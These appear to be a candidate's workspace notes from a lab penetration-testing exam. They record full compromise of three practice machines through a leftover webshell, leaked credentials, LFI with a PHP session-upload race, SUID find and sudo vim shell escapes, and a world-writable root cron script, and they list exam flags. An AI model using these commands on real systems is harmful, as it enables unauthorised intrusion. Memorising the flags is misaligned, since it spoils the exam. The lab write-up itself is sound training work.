---
doc_kind: workspace-notes
id: thundercipher-tc-vapt-exam
title: "ThunderCipher TC-VAPT Exam"
category: web
status: new
tags:
  []
---
# Notes

- hypotheses:
- validated findings:
- dead ends:

## UploadX (192.168.5.119) — SOLVED
- nmap: 22/tcp ssh, 80/tcp http (Apache 2.4.63 Ubuntu, PHP)
- index.html: static decoy, HTML comment "TODO: Remove dev upload endpoint before production"
- /uploads/ -> directory listing enabled, exposes credential.php + file.php (pre-existing webshell/leftover)
- file.php?cmd=<cmd> -> unauthenticated RCE as www-data (confirmed: `id` -> uid=33(www-data))
- credential.php source leak via `cmd=cat /var/www/html/uploads/credential.php`: creds uploadx:UploadX@123 (dev backup creds left in comment)
- SSH as uploadx w/ those creds -> user.txt: ThunderCipher{uploadx_user_initial_access_7ac91e}
- privesc: /usr/bin/find is SUID root (-rwsr-x--- root uploadx) -> `find /usr/bin/find -exec id \;` => euid=0
- root.txt: ThunderCipher{uploadx_root_full_system_control_a91f2c}
- Repro: `find /usr/bin/find -exec /bin/sh -p \;` for an interactive root shell (used -exec cat for flag directly)

## Vault (192.168.5.249) — SOLVED
- nmap: 22/tcp ssh, 80/tcp http (Apache 2.4.63 Ubuntu, PHP login portal)
- /backup/ -> directory listing enabled -> config.php.bak leaked
- config.php.bak contents: $db_user="admin"; $db_pass="SuperSecure123";
- Creds reused for both web login AND SSH (same admin user, uid 1000)
- user.txt: ThunderCipher{vault_user_9f3a7c2d8b1e_secureaccess}
- sudo -l: (ALL) NOPASSWD: /usr/bin/vim  -> GTFOBins
- Repro: `sudo vim -c ':!/bin/sh' -c ':q!' -c ':q!'` (used :!cat /root/root.txt directly)
- root.txt: ThunderCipher{vault_root_a81c92ff7e6d_fullcompromise}

## Phantom (192.168.5.237) — IN PROGRESS (root pending)
- nmap: 22/tcp ssh, 80/tcp http (Apache 2.4.63 Ubuntu, PHP 8.4)
- index.php: `$page = $_GET['page'] ?? 'home.php'; include($page);` -> unauthenticated LFI (no sanitization)
  - Confirmed source via `?page=php://filter/convert.base64-encode/resource=/var/www/html/index.php`
  - allow_url_include=Off (php.ini) -> data://, php://input wrappers for direct RCE blocked
  - /var/log/* unreadable by www-data (not in adm group) -> classic log-poisoning LFI->RCE blocked
- RCE achieved via **PHP session.upload_progress race condition**:
  - POST multipart/form-data with field PHP_SESSION_UPLOAD_PROGRESS=<php payload>, cookie PHPSESSID=<chosen id>, slow-drip a large file field to keep session file alive on disk
  - Race parallel GET `?page=/var/lib/php/sessions/sess_<id>&c=<cmd>` while upload in flight
  - Script: artifacts/race_lfi.py (usage: `python3 -I race_lfi.py "<shell cmd>"`)
  - Confirmed: id -> uid=33(www-data)
- user.txt (readable directly despite /home/phantom being drwx--x--x): ThunderCipher{phantom_lfi_to_ssh_access_gained_7f3a9c2d8e1b}
- Persistence/privesc vector found (matches challenge theme "investigate persistence"): `/etc/crontab` has
  `* * * * * root /opt/backup.sh` where /opt/backup.sh is **-rwxrwxrwx root:root** (world-writable root cron job)
- Exploit: overwrote /opt/backup.sh with `cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash`, waiting for next cron minute tick (background poller running)
- Next: once /tmp/rootbash is SUID, run via LFI RCE: `/tmp/rootbash -p -c 'cat /root/root.txt'` for root flag

### Phantom root — DONE
- /tmp is mounted nosuid (confirmed via `mount`), so the initial SUID-bash-in-/tmp approach silently failed (chmod succeeded but bit never honored at exec).
- Pivoted: /opt/backup.sh (world-writable, root:root) rewritten to `cat /root/root.txt > /opt/out.txt; chmod 666 /opt/out.txt` (writing inside /opt avoids nosuid entirely — no exec bit needed, just root reading the flag for us).
- Root cron (`* * * * * root /opt/backup.sh`) ran within ~60s, flag exfiltrated via LFI `?page=/opt/out.txt`.
- root.txt: ThunderCipher{phantom_full_chain_privilege_escalation_root_91ac7d2f8b6e}
- Cleanup performed: backup.sh restored to original content, /opt/out.txt /tmp/rootbash /tmp/cron_test removed.

## EXAM SUMMARY — all 3 machines fully compromised (user+root)
| Target | User flag | Root flag |
|---|---|---|
| Vault | ThunderCipher{vault_user_9f3a7c2d8b1e_secureaccess} | ThunderCipher{vault_root_a81c92ff7e6d_fullcompromise} |
| UploadX | ThunderCipher{uploadx_user_initial_access_7ac91e} | ThunderCipher{uploadx_root_full_system_control_a91f2c} |
| Phantom | ThunderCipher{phantom_lfi_to_ssh_access_gained_7f3a9c2d8e1b} | ThunderCipher{phantom_full_chain_privilege_escalation_root_91ac7d2f8b6e} |

Exam objective (initial access + root on every machine, both flags each) is COMPLETE.
Remaining for user: write up report (step-by-step, tools/commands, screenshots) and submit PDF to reports@thundercipher.in within 24h of completion.
